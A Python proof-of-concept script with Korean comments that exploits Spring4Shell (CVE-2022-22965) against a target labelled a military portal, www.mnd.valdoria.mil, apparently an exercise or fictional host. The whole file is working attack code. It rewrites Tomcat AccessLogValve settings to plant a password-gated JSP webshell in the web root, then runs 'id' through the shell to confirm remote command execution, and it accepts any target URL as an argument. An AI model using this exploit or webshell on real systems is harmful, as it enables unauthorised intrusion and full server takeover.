#!/usr/bin/env python3
"""
Spring4Shell (CVE-2022-22965) PoC — D1 Military Portal
=======================================================

VULN-D1-01: Spring4Shell RCE

대상: www.mnd.valdoria.mil (211.57.64.10)
취약 엔드포인트: /search.do (SearchController — POJO 파라미터 바인딩)
전제 조건: Spring 5.3.17 + JDK 11 + WAR on Tomcat 9.0.62

공격 원리:
  Spring DataBinder가 class.module.classLoader 경로를 통해
  Tomcat AccessLogValve 속성을 조작 → 임의 JSP 파일(웹셸) 생성

사용법:
  python3 spring4shell_poc.py [--target URL] [--endpoint PATH] [--shell NAME]
"""

import requests
import sys
import argparse
import urllib3

# TLS 검증 경고 비활성화 (자체서명 인증서)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_TARGET = "https://www.mnd.valdoria.mil"
DEFAULT_ENDPOINT = "/search.do"
DEFAULT_SHELL = "cmd"


def exploit(target: str, endpoint: str, shell_name: str) -> bool:
    """
    Tomcat AccessLogValve를 조작하여 JSP 웹셸 생성

    공격 단계:
      1. AccessLogValve의 pattern, suffix, directory, prefix, fileDateFormat 속성 조작
      2. 로그 기록 트리거 (HTTP 요청) → 웹셸 파일 생성
      3. 생성된 웹셸로 명령 실행 확인
    """

    # JSP 웹셸 코드 (Request Header 'c2'에서 주입)
    webshell_pattern = (
        '%{c2}i if("j".equals(request.getParameter("pwd")))'
        '{java.io.InputStream in=Runtime.getRuntime().exec('
        'request.getParameter("cmd")).getInputStream();'
        'int a=-1;byte[] b=new byte[2048];'
        'while((a=in.read(b))!=-1){out.println(new String(b));}}'
    )

    # Step 1: AccessLogValve 속성 조작
    payload = {
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern": webshell_pattern,
        "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp",
        "class.module.classLoader.resources.context.parent.pipeline.first.directory": "webapps/ROOT",
        "class.module.classLoader.resources.context.parent.pipeline.first.prefix": shell_name,
        "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": "",
    }

    url = f"{target}{endpoint}"
    print(f"[*] Target: {target}")
    print(f"[*] Endpoint: {endpoint}")
    print(f"[*] Shell name: {shell_name}.jsp")
    print()

    print("[1/3] Sending exploit payload (AccessLogValve manipulation)...")
    try:
        r = requests.post(url, data=payload, verify=False, timeout=10)
        print(f"      Response: {r.status_code}")
    except requests.RequestException as e:
        print(f"      [-] Request failed: {e}")
        return False

    # Step 2: 로그 기록 트리거 → 웹셸 파일 생성
    print("[2/3] Triggering log write (webshell file creation)...")
    try:
        requests.get(target, headers={"c2": "<%"}, verify=False, timeout=10)
        print("      Log write triggered")
    except requests.RequestException as e:
        print(f"      [-] Trigger failed: {e}")
        return False

    # Step 3: 웹셸 접근 확인
    shell_url = f"{target}/{shell_name}.jsp"
    print(f"[3/3] Verifying webshell at: {shell_url}")
    try:
        r = requests.get(
            f"{shell_url}?pwd=j&cmd=id",
            verify=False,
            timeout=10
        )
        if r.status_code == 200 and "tomcat" in r.text:
            print()
            print(f"[+] SUCCESS! Webshell deployed at {shell_url}")
            print(f"[+] Usage: {shell_url}?pwd=j&cmd=<COMMAND>")
            print(f"[+] Response: {r.text.strip()}")
            return True
        else:
            print(f"      Status: {r.status_code}")
            print("[-] Exploit may have failed or webshell not accessible yet")
            print("    Try accessing the shell URL manually after a moment")
            return False
    except requests.RequestException as e:
        print(f"      [-] Verification failed: {e}")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="Spring4Shell (CVE-2022-22965) PoC for D1 Military Portal"
    )
    parser.add_argument(
        "--target", "-t",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--endpoint", "-e",
        default=DEFAULT_ENDPOINT,
        help=f"Vulnerable endpoint (default: {DEFAULT_ENDPOINT})"
    )
    parser.add_argument(
        "--shell", "-s",
        default=DEFAULT_SHELL,
        help=f"Webshell filename prefix (default: {DEFAULT_SHELL})"
    )

    args = parser.parse_args()

    print("=" * 60)
    print("  Spring4Shell (CVE-2022-22965) — D1 Military Portal PoC")
    print("=" * 60)
    print()

    success = exploit(args.target, args.endpoint, args.shell)
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
